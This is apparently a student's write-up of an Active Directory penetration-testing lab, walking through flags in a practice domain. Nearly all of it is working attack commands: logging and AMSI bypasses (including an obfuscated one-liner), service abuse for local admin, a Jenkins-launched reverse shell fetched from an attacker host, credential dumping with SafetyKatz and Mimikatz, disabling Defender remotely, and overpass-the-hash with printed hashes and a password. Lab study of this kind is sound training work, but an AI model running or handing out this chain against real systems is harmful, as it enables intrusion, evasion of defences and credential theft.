Start by running Invishell to avoid being detected
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
### **FLAG 1 - SID of the member of the Enterprise Admins group**

Import powerView script
```powershell
. C:\AD\Tools\PowerView.ps1
```
Use the following command to get the SID of the domain users
```Powerview
Get-DomainGroupMember -Identity "Enterprise Admins"
```
But it doesn't return nothing because this computer is not in the root domain. So we need to query the root domain
```powerview
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```
![[Pasted image 20231018115633.png]]

### **FLAG 2 - Display name of the GPO applied on StudentMachines OU**
Task
Enumerate following for the dollarcorp domain:
- List all the OUs
- List all the computers in the StudentMachines OU.
- List the GPOs 
- Enumerate GPO applied on the StudentMachines OU.
*List all the OUs*
Use the command
```powerview
Get-DomainOU
```

*List all the computers in the StudentMachines OU*
We can list all OUs names
```powerview
Get-DomainOU | select -ExpandProperty name
```
![[Pasted image 20231018120557.png]]
and select only the StudenMachines OU name
```PowerView
(Get-DomainOU -Identity StudentMachines).distinguishedname | 
%{Get-DomainComputer -SearchBase $_} | select name
```

*List the GPOs*
Use the command
```powerview
Get-DomainGPO
```

*Enumerate GPO applied on the StudentMachines OU*
Now copy the cn of the student machines with this command
```Powerview
(Get-DomainOU -Identity StudentMachines).gplink
```
![[Pasted image 20231018121132.png]]
And use it to retrieve the StudentMachines GPOs
```powerview
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'
```
![[Pasted image 20231018121240.png]]

### **FLAG 3 - ActiveDirectory Rights for RDPUsers group on the users named ControlxUser**
Enumerate following for the dollarcorp domain:
- ACL for the Domain Admins group
- All modify rights/permissions for the studentx
*ACL for the Domain Admins group*
To get all ACLs
 ```PowerView
Get-DomainObjectAcl
```
To retrieve the ACLs for the Group admin group
```Powerview
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```
*All modify rights/permissions for the studentx*
To find interesting ACLs for user student115 (me)
```powerview
Find-InterestingDomainAcl -ResolveGUIDs |  ?{$_.IdentityReferenceName -match "student115"}
```
To find interesting ACLs for RDPUsers group
```powerview
Find-InterestingDomainAcl -ResolveGUIDs |  ?{$_.IdentityReferenceName -match "RDPUsers"}
```
![[Pasted image 20231018125919.png]]
### **FLAG 4 - Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local**
- Enumerate all domains in the moneycorp.local forest. 
- Map the trusts of the dollarcorp.moneycorp.local domain.
- Map External trusts in moneycorp.local forest. 
- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
*Enumerate all domains in the moneycorp.local forest*
Use the next command
 ```PowerView
Get-ForestDomain
```
![[Pasted image 20231018142754.png]]

*Map the trusts of the dollarcorp.moneycorp.local domain*
 ```PowerView
Get-DomainTrust
```
![[Pasted image 20231018130229.png]]
*Map External trusts in moneycorp.local forest*
To  list only the external trusts int the current forest
```Powerview
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
![[Pasted image 20231018143331.png]]

*Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?*
```Powerview
 Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
![[Pasted image 20231018143757.png]]
enumerate trusts for eurocorp.local forest (Needed bi-directional or on way trust)
```Powerview
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```
![[Pasted image 20231018144327.png]]

### **FLAG 5/6/7/8 - Service Abuse/Lateral movement/Jenkins**
- Exploit a service on dcorp-studentx and elevate privileges to local administrator. 
- Identify a machine in the domain where studentx has local administrative access.
- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.
*Exploit a service on dcorp-studentx and elevate privileges to local administrator*
Import PowerUp.ps1
```powershell
. C:\AD\Tools\PowerUp.ps1
```
And launch the enumeration for possible privesc
```PowerUp
Invoke-AllChecks
```
![[Pasted image 20231018145259.png]]
Abuse the service
```PowerUp
Invoke-ServiceAbuse -Name 'AbyssWebServer'
```
or to add ou user to the Local Administrator group
```PowerUp
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student115' -Verbose
```
![[Pasted image 20231018145807.png]]
*Identify a machine in the domain where studentx has local administrative access.*
```powershell
. .\Find-PSremotingLocalAdminAccess.ps1
```
```powershell
Find-PSremotingLocalAdminAccess -verbose
```
![[Pasted image 20231018151010.png]]
Connect to the machine found
```powershell
winrs -r:dcorp-adminsrv cmd
```
*Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server*
If we go to the “People” page of Jenkins we can see the users present on the Jenkins instance. Since Jenkins does not have a password policy many users use username as passwords even on the 
publicly available instances.
In this case `builduser:builduser ` 
Use the modified version of invoke-powershelltcp.ps1 and download with jenkins to run it as the user running jenkils
```powershell
powershell.exe iex (iwr http://172.16.100.115/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.99.115 -Port 443
```
![[Pasted image 20231018153601.png]]

### **FLAG 9 - Collection method in BloodHound that covers all the collection methods**
Launch sharpound on the student vm and export it to kali to use bloodhound
### **FLAG 10/11/12/13/14/15 - svcadmin/NTLM **
- Identify a machine in the target domain where a Domain Admin session is available. 
- Compromise the machine and escalate privileges to Domain Admin
	- Using access to dcorp-ci
	- Using derivative local admin
*Identify a machine in the target domain where a Domain Admin session is available*
First bypass the Enhanced Script Block Logging on the reverse shell
```powershell
iex (iwr http://172.16.100.115/sbloggingbypass.txt -UseBasicParsing)
```
To bypass the AMSI
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
Now download powerview on the reverse shell to enumerate the machines where the domain admin is logged in
```powershell
iex ((New-Object Net.WebClient).DownloadString('http://172.16.99.115/PowerView.ps1'))
```
launch the command
```powerview
Find-DomainUserLocation
```
![[Pasted image 20231018164427.png]]
Connect using winrs
```powershell
winrs -r:dcorp-mgmt whoami
```
![[Pasted image 20231018164816.png]]
*Abuse using winrs*
To extract credentials from the machine we could run safetykatz. To do that we should copy loader.exe on the machine.
```powershell
iwr http://172.16.100.115/Loader.exe -OutFile C:\Users\Public\Loader.exe
```
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```
To avoid detection while download safetykatz add a portforwarding on the remote machine
```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115"
```
Launch safety katz
```Powershell
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
![[Pasted image 20231019104347.png]]
==Works only if file is hosted inside the network==
we get svcadmin aes256_hmac, rc4_hmac_nt and password on DCORP-mngm
______
Second Method - Abusing PS-Remoting
Download Invoke-Mimi
```powershell
iex (iwr http://172.16.100.115/Invoke-Mimi.ps1 -UseBasicParsing)
```
Create a session with pssession
```powershell
 $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```
Disable AMSI on the remote machine
```powershell
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```
Run invoke-mimi
```powershell
Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
```

`DCORP-DC svcadmin creds`

| Type        | Hash                                                             |
| ----------- | ---------------------------------------------------------------- |
| Password    | \*ThisisBlasphemyThisisMadness!!                                 |
| aes256_hmac | 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 |
| rc4_hmac_nt | b38ff50264b74508085d82c69794a4d8                                 |

Finally we can use the OverPass-the-Hash technique to access on dcorp-dc

Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
